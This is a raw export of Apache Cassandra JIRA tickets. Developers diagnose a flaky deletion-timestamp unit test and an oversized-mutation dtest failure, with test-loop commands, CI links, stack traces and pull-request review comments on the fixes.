To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 15:24;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,CASSANDRA-17463,,,,,,,,,,,,,CASSANDRA-16512,CASSANDRA-17463,,,,,,,,,,,,,,,CASSANDRA-17685,CASSANDRA-17686,,,,,,,,,0.0,sathyakplm,,,,,,,,,,,,,,Correctness -> Consistency,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jun 07 14:13:47 UTC 2022,,,,,,,All,,,,"0|z10o3c:",9223372036854775807,,,,adelapena,blerer,e.dimitrova,,Normal,,4.1-alpha,,https://github.com/apache/cassandra/commit/9b4784bdb7d70bf99c9c290d44b053902b00642d,,,,,,,,,Test fix,,,,,"22/Mar/22 16:23;sathyakplm;[~adelapena] , I tried running the test 11 times and it did not fail even once. Do we have any way to reproduce. I tried this in trunk.;;;","22/Mar/22 16:47;brandon.williams;[~sathyakplm] that's simply not enough iterations.  You can loop the test in bash 100 times like this:

{code}
$ for x in `seq 1 100`;do ant testsome -Dtest.name=org.apache.cassandra.db.SinglePartitionSliceCommandTest -Dtest.methods=testPartitionDeletionRangeDeletionTie || break; done
{code}

and it will fail before completing the iterations.;;;","25/Mar/22 07:48;sathyakplm;[~brandon.williams]  I tried 100 times. All were successful. Do you think we should try for 500?

 ;;;","25/Mar/22 11:20;brandon.williams;[~sathyakplm] it failed in probably 20 runs or less for me, are you sure you are on trunk?  The test passes on other branches.;;;","25/Mar/22 12:34;adelapena;Here is another CircleCI run of {{SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie}} on trunk:
[https://app.circleci.com/pipelines/github/adelapena/cassandra/1438/workflows/38c1ad09-57cb-4783-ba54-34c2851bbcf5/jobs/14714]
There are 21 hits in 1000 iterations. The config for Circle was generated with:
{code}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=1000 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.db.SinglePartitionSliceCommandTest \
  -e REPEATED_UTEST_METHODS=testPartitionDeletionRangeDeletionTie
{code}
I'm also able to reproduce it locally.;;;","25/Mar/22 17:32;brandon.williams;I had a failure on the 17th iteration this time, on a machine with plenty of resources.;;;","25/Mar/22 17:35;sathyakplm;It failed for me this time. Thank you. Will debug further.;;;","27/Mar/22 06:46;sathyakplm;h5. The Problem


There are two delete statements in this test case.
h6. First delete statement

 
{code:java}
QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
    timestamp,
    ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1"");{code}
 
h6. Second delete statement

 
{code:java}
QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
    timestamp,
    ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1 and c1=1"");{code}
The test case fails when the first statement and second statement falls in different `second` boundaries. We are passing `nowInSec`; but, this is not being respected while the entry is inserted. `FBUtilities.nowInSeconds()` is getting called instead.
h5. Solution


Use `makeInternalOptionsWithNowInSec` instead of `makeInternalOptions`. This change makes sure that it respects the variable `nowInSec`.;;;","27/Mar/22 06:49;sathyakplm;[~adelapena] , [~brandon.williams] , since I am new to Cassandra community, could you please help me in testing this change with CircleCI. I am not a committer; will I have access to trigger CircleCI? If yes, please provide me the pointer to trigger one.;;;","27/Mar/22 06:52;sathyakplm;Adding [~blerer] for visibility.;;;","27/Mar/22 16:18;brandon.williams;[~sathyakplm] see https://cassandra.apache.org/_/development/index.html#circleci you can use circle but without a paid account you won't be able to allocate enough resources for some of the tests.  In this case, it will likely require the repeated run that Andres did earlier with the medium resource configuration he used that unfortunately won't be available at the free tier.;;;","28/Mar/22 11:57;adelapena;I think this particular test failure can be reproduced even with Circle's free tier and low resources, like in [this 200-iteration run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1451/workflows/22c1f8f4-c0fd-4e08-a853-b60b36ee4f8c/jobs/14813/tests]. Low resources config can be generated with:
{code}
.circleci/generate.sh -l \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=200 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.db.SinglePartitionSliceCommandTest \
  -e REPEATED_UTEST_METHODS=testPartitionDeletionRangeDeletionTie
{code};;;","28/Mar/22 12:06;brandon.williams;Oh nice, thanks.  I didn't realize low resources could cover this,;;;","28/Mar/22 16:23;sathyakplm;I tried with the above suggested script. The pipelines are still in ""hold"" state. https://app.circleci.com/pipelines/github/sathyakplm/cassandra/4/workflows/76f67a54-adb4-41c1-948d-1ebf6d281991;;;","28/Mar/22 16:37;brandon.williams;I think you need to approve them to start by clicking on the thumbs up approval icon.  Our config starts with them all disabled so we don't accidentally waste resources.;;;","30/Mar/22 01:01;sathyakplm;Thanks [~brandon.williams] , [~adelapena] , I had triggered 200 iterations. The tests passed: https://app.circleci.com/pipelines/github/sathyakplm/cassandra/4/workflows/76f67a54-adb4-41c1-948d-1ebf6d281991/jobs/2/tests;;;","30/Mar/22 13:34;blerer;I had a look at the code and the patch will fix this specific use case but it looks like CEP-14 might have introduced  similar problems for other methods from QueryProcessor.
The following seems suspicious to me:
* executeInternalWithNow
* executeInternalRawWithNow;;;","30/Mar/22 13:50;sathyakplm;So, what's the plan? Should we take this patch? Or create another Jira issue to find and resolve the issues at other places?;;;","01/Apr/22 14:29;sathyakplm;Hi [~brandon.williams] , [~blerer] , are we taking this patch?;;;","04/Apr/22 10:33;blerer;We can commit this one and open a new ticket for the 2 other ones.;;;","11/May/22 13:09;adelapena;[~sathyakplm] I understand that the patch is [this commit|https://github.com/sathyakplm/cassandra/commits/17458], is this right?;;;","11/May/22 16:09;adelapena;I have rebased the patch and started CI with repeated runs for {{{}SinglePartitionSliceCommandTest{}}}:
||Patch||CI||
|[4.1 |https://github.com/adelapena/cassandra/commit/0fc3ba4fa91479a201d2050e0ea847d0325cf296]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1537/workflows/171805ea-db04-4dfc-a609-c05b2bf959bf] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1537/workflows/16d3b755-f60c-4ede-8df5-e1b9bfcc3673]|
|[trunk|https://github.com/adelapena/cassandra/commit/eb88e2afa971c48cac72d7e6858d1dc371c7607a]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1535/workflows/2ae4b473-58e8-4ec1-a633-77935b09d871] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1535/workflows/a1026ec7-8517-4be7-92bf-c642e69de1b5]|

I have also replaced the calls to {{makeInternalOptions}} by {{makeInternalOptionsWithNowInSec}} in the methods suggested by [~blerer], and also in:
 * [{{executeAsync(InetAddressAndPort, String, Object...)}}|https://github.com/adelapena/cassandra/blob/0fc3ba4fa91479a201d2050e0ea847d0325cf296/src/java/org/apache/cassandra/cql3/QueryProcessor.java#L454-L461]
 * [{{execute(String, ConsistencyLevel, QueryState, Object...)}}|https://github.com/adelapena/cassandra/blob/0fc3ba4fa91479a201d2050e0ea847d0325cf296/src/java/org/apache/cassandra/cql3/QueryProcessor.java#L525-L531]
 * [{{executeInternalWithPaging(String, int, Object...)}}|https://github.com/adelapena/cassandra/blob/0fc3ba4fa91479a201d2050e0ea847d0325cf296/src/java/org/apache/cassandra/cql3/QueryProcessor.java#L543-L550]

CI for those additional changes is running:
||Patch||CI||
|[4.1 |https://github.com/adelapena/cassandra/commit/f4b431dfbd6cb0e84df041024585d3a10d0e59bd]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1538/workflows/718a5c38-be30-4fa4-b25c-a62e07bbb58e] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1538/workflows/53be68bd-8475-43e1-ad6f-7c58687cf2b6]|
|[trunk|https://github.com/adelapena/cassandra/commit/dfbfca0e56b25a380c52e71fff662c33fa7b3f90]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1536/workflows/314f22de-ceeb-4d0a-9c10-97f09330b46b] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1536/workflows/4258809b-8f54-43b2-8ecb-32657cb8dae3]|;;;","19/May/22 22:00;brandon.williams;Should this be Patch Available?;;;","20/May/22 11:06;adelapena;Yes, I think this should be Patch Available.;;;","26/May/22 16:16;adelapena;I have rebased the patch with the additional changes mentioned above:
||Patch||CI||
|[4.1 |https://github.com/adelapena/cassandra/commit/0fc3ba4fa91479a201d2050e0ea847d0325cf296]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1615/workflows/8bccc5b1-338c-49b7-b40f-7c12b14ee225] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1615/workflows/a07665e2-5ed1-4189-86d0-4003867cdb31]|
|[trunk|https://github.com/adelapena/cassandra/commit/eb88e2afa971c48cac72d7e6858d1dc371c7607a]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1614/workflows/f2d9a0c8-109a-4b21-b781-4751de7c6abb] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1614/workflows/f38cd087-160c-4341-98e2-1f6659c5c391]|

It seems that the run for 4.1 has [a failure on {{testInvalidateSingleCredential}}|https://app.circleci.com/pipelines/github/adelapena/cassandra/1615/workflows/8bccc5b1-338c-49b7-b40f-7c12b14ee225/jobs/17131]. That failure [doesn't appear on Butler|https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/cassandra-4.1], but it can be reproduced also on the unpatched {{cassandra-4.1}} branch with the multiplexer, as it's shown by [this run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1620/workflows/89946e82-6a5c-44ec-bbdb-45b16a587360]. Apparently we have been very unlucky with that CI run because the multiplexer points to a flakiness lesser than 1%. In any case, that failure doesn't seem caused by this patch.

[~sathyakplm] do you agree with the proposed additional changes?

Also, we are going to need a second committer/reviewer here.;;;","26/May/22 16:17;e.dimitrova;I can take it later today. ;;;","26/May/22 23:54;e.dimitrova;I am +1 on the suggested changes, whether to split into two tickets - it's up to [~sathyakplm];;;","02/Jun/22 15:27;e.dimitrova;Hi [~sathyakplm], I was wondering whether you had the chance to look into this one. Do you agree we can commit your fix plus the additional changes added from [~adelapena] ?;;;","03/Jun/22 01:03;sathyakplm;[~e.dimitrova] , yes. I agree.;;;","06/Jun/22 11:04;adelapena;A final CI round of the rebased patches before commit:
||Patch||CI||
|[4.1 |https://github.com/adelapena/cassandra/commit/b3810396bc4ea6e3055dc48ede6dd9ecb29d5664]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1663/workflows/c63703e3-8c7a-42c6-981a-53cb59babe1f] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1663/workflows/36c3b1aa-8149-4681-ba9c-a4a5a00bef3d]|
|[trunk|https://github.com/adelapena/cassandra/commit/f384a6ab792ab33e3b74fcd3df879ff6258809dd]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1662/workflows/b5753cdb-2d08-44d0-9caf-79b5fd0b01f4] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1662/workflows/73078ee8-9b81-4fd3-9a21-8375aaa6a867]|;;;","07/Jun/22 10:25;adelapena;That last run has hit two dtest failures. I can't find these test failures in Butler, but they can be reproduced in the base branches with the multiplexer:
|4.1|test_optimized_primary_range_repair|[multiplexer|https://app.circleci.com/pipelines/github/adelapena/cassandra/1666/workflows/6f925be1-c0df-4b2a-83e0-4612a46f32bd]|
|trunk|TestPreviewRepair::test_preview|[multiplexer|https://app.circleci.com/pipelines/github/adelapena/cassandra/1667/workflows/60ba0ade-7e4e-4728-a7ff-3872f2a1903c]|

In both cases the flakiness is below 1%. I'll open tickets reporting these flaky tests. I think we can still commit this fix despite of these unrelated failures.;;;","07/Jun/22 10:30;e.dimitrova;Agreed, +1;;;","07/Jun/22 12:09;adelapena;Thanks, committed to {{cassandra-4.1}} as [9b4784bdb7d70bf99c9c290d44b053902b00642d|https://github.com/apache/cassandra/commit/9b4784bdb7d70bf99c9c290d44b053902b00642d] and merged to [{{trunk}}|https://github.com/apache/cassandra/commit/29fea66c89cc1b378aafbaca8d68d21697e667b7].;;;","07/Jun/22 14:13;adelapena;Created CASSANDRA-17685 and CASSANDRA-17686 for those last test failures.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failures: write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation,CASSANDRA-17456,13434620,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,Gerrrr,e.dimitrova,e.dimitrova,18/Mar/22 20:07,27/May/22 19:24,13/Jul/23 08:40,09/May/22 09:05,4.1,4.1-alpha1,,,,,CI,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-trunk/1002/testReport/dtest-offheap.write_failures_test/TestMultiDCWriteFailures/test_oversized_mutation/
{code:java}
Error Message
AssertionError: assert 0 == 8  +  where 8 = <bound method JolokiaAgent.read_attribute of <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>>('org.apache.cassandra.metrics:type=Storage,name=TotalHints', 'Count')  +    where <bound method JolokiaAgent.read_attribute of <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>> = <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>.read_attribute  +    and   'org.apache.cassandra.metrics:type=Storage,name=TotalHints' = make_mbean('metrics', type='Storage', name='TotalHints')
Stacktrace
self = <write_failures_test.TestMultiDCWriteFailures object at 0x7f1fca9dac40>

    def test_oversized_mutation(self):
        """"""
            Test that multi-DC write failures return operation failed rather than a timeout.
            @jira_ticket CASSANDRA-16334.
            """"""
    
        cluster = self.cluster
        cluster.populate([2, 2])
        cluster.set_configuration_options(values={'max_mutation_size_in_kb': 128})
        cluster.start()
    
        node1 = cluster.nodelist()[0]
        session = self.patient_exclusive_cql_connection(node1)
    
        session.execute(""CREATE KEYSPACE k WITH replication = {'class': 'NetworkTopologyStrategy', 'dc1': 2, 'dc2': 2}"")
        session.execute(""CREATE TABLE k.t (key int PRIMARY KEY, val blob)"")
    
        payload = '1' * 1024 * 256
        query = ""INSERT INTO k.t (key, val) VALUES (1, textAsBlob('{}'))"".format(payload)
    
        assert_write_failure(session, query, ConsistencyLevel.LOCAL_ONE)
        assert_write_failure(session, query, ConsistencyLevel.ONE)
    
        # verify that no hints are created
        with JolokiaAgent(node1) as jmx:
>           assert 0 == jmx.read_attribute(make_mbean('metrics', type='Storage', name='TotalHints'), 'Count')
E           AssertionError: assert 0 == 8
E            +  where 8 = <bound method JolokiaAgent.read_attribute of <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>>('org.apache.cassandra.metrics:type=Storage,name=TotalHints', 'Count')
E            +    where <bound method JolokiaAgent.read_attribute of <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>> = <tools.jmxutils.JolokiaAgent object at 0x7f1fca78dac0>.read_attribute
E            +    and   'org.apache.cassandra.metrics:type=Storage,name=TotalHints' = make_mbean('metrics', type='Storage', name='TotalHints')

write_failures_test.py:277: AssertionError
REST API
CloudBees CI Client Controller 2.319.3.4-rolling



{code}",,adelapena,benedict,e.dimitrova,Gerrrr,jmckenzie,maedhroz,,,,,,,,,"adelapena commented on code in PR #1588:
URL: https://github.com/apache/cassandra/pull/1588#discussion_r857817469


##########
test/unit/org/apache/cassandra/db/commitlog/CommitLogTest.java:
##########
@@ -476,69 +476,6 @@ public void testEqualRecordLimit() throws Exception
         CommitLog.instance.add(rm);
     }
 
-    @Test(expected = MutationExceededMaxSizeException.class)
-    public void testExceedRecordLimit() throws Exception
-    {
-        Keyspace ks = Keyspace.open(KEYSPACE1);
-        ColumnFamilyStore cfs = ks.getColumnFamilyStore(STANDARD1);
-        Mutation rm = new RowUpdateBuilder(cfs.metadata(), 0, ""k"")
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize()))
-                      .build();
-        long cnt = CommitLog.instance.metrics.oversizedMutations.getCount();
-        try
-        {
-            CommitLog.instance.add(rm);
-        }
-        catch (MutationExceededMaxSizeException e)
-        {
-            assertEquals(cnt + 1, CommitLog.instance.metrics.oversizedMutations.getCount());
-            throw e;
-        }
-        throw new AssertionError(""mutation larger than limit was accepted"");
-    }
-    @Test
-    public void testExceedRecordLimitWithMultiplePartitions() throws Exception
-    {
-        CommitLog.instance.resetUnsafe(true);
-        List<Mutation> mutations = new ArrayList<>();
-        Keyspace ks = Keyspace.open(KEYSPACE1);
-        char[] keyChars = new char[MutationExceededMaxSizeException.PARTITION_MESSAGE_LIMIT];
-        Arrays.fill(keyChars, 'k');
-        String key = new String(keyChars);
-
-        // large mutation
-        mutations.add(new RowUpdateBuilder(ks.getColumnFamilyStore(STANDARD1).metadata(), 0, key)
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize()))
-                      .build());
-
-        // smaller mutation
-        mutations.add(new RowUpdateBuilder(ks.getColumnFamilyStore(STANDARD2).metadata(), 0, key)
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize() - 1024))
-                      .build());
-
-        Mutation mutation = Mutation.merge(mutations);
-        try
-        {
-            CommitLog.instance.add(Mutation.merge(mutations));
-            throw new AssertionError(""mutation larger than limit was accepted"");
-        }
-        catch (MutationExceededMaxSizeException exception)
-        {
-            String message = exception.getMessage();
-
-            long mutationSize = mutation.serializedSize(MessagingService.current_version) + ENTRY_OVERHEAD_SIZE;

Review Comment:
   Nit: this leaves the static import of `ENTRY_OVERHEAD_SIZE` usued.



##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 49);
+            String query = ""INSERT INTO %s.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }

Review Comment:
   The actual size of `50233` might be a bit fragile if we change serialization formats, maybe we could omit it and do something like:
   ```java
   Assertions.assertThatThrownBy(() -> cluster.coordinator(1).execute(withKeyspace(query), ALL))
             .hasMessageContaining(""Rejected an oversized mutation ("")
             .hasMessageContaining(""49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"");
   ```
   wdyt? The same would apply to the other test for batches below.



##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 49);
+            String query = ""INSERT INTO %s.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }
+        }
+    }
+
+    @Test
+    public void testOversizedBatch() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE KEYSPACE ks1 WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 1};""));
+            cluster.schemaChange(withKeyspace(""CREATE TABLE ks1.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 48);
+            String query = ""BEGIN BATCH\n"" +
+                           ""INSERT INTO ks1.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))\n"" +
+                           ""INSERT INTO ks1.t (key, val) VALUES (2, textAsBlob('222'))\n"" +
+                           ""APPLY BATCH"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (49209/49152) for keyspace: ks1. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }

Review Comment:
   Nit: this can be slightly simplified using `assertThatThrownBy`:
   ```suggestion
               Assertions.assertThatThrownBy(() -> cluster.coordinator(1).execute(withKeyspace(query), ALL))
                         .hasMessage(""Rejected an oversized mutation (49209/49152) for keyspace: ks1. Top keys are: t.1"");
   ```



##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 49);
+            String query = ""INSERT INTO %s.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }

Review Comment:
   Nit: this can be slightly simplified using `assertThatThrownBy`:
   ```suggestion
               Assertions.assertThatThrownBy(() -> cluster.coordinator(1).execute(withKeyspace(query), ALL))
                         .hasMessage(""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"");
   ```



;25/Apr/22 16:37;githubbot;600","adelapena commented on code in PR #1588:
URL: https://github.com/apache/cassandra/pull/1588#discussion_r857833304


##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))

Review Comment:
   Nit: `max_mutation_size_in_kb` is going to be replaced by `max_mutation_size`, we could the latter here so we don't have to come back and change this when we remove the former:
   ```suggestion
           try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size"", ""48KiB""))
   ```
   The same applies to the test for batches below.



;25/Apr/22 16:49;githubbot;600","adelapena commented on code in PR #1588:
URL: https://github.com/apache/cassandra/pull/1588#discussion_r857833304


##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))

Review Comment:
   Nit: `max_mutation_size_in_kb` is going to be replaced by `max_mutation_size`, we could use the latter here so we don't have to come back and change this when we remove the former:
   ```suggestion
           try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size"", ""48KiB""))
   ```
   The same applies to the test for batches below.



;25/Apr/22 16:50;githubbot;600","Gerrrr commented on code in PR #1588:
URL: https://github.com/apache/cassandra/pull/1588#discussion_r858623194


##########
test/unit/org/apache/cassandra/db/commitlog/CommitLogTest.java:
##########
@@ -476,69 +476,6 @@ public void testEqualRecordLimit() throws Exception
         CommitLog.instance.add(rm);
     }
 
-    @Test(expected = MutationExceededMaxSizeException.class)
-    public void testExceedRecordLimit() throws Exception
-    {
-        Keyspace ks = Keyspace.open(KEYSPACE1);
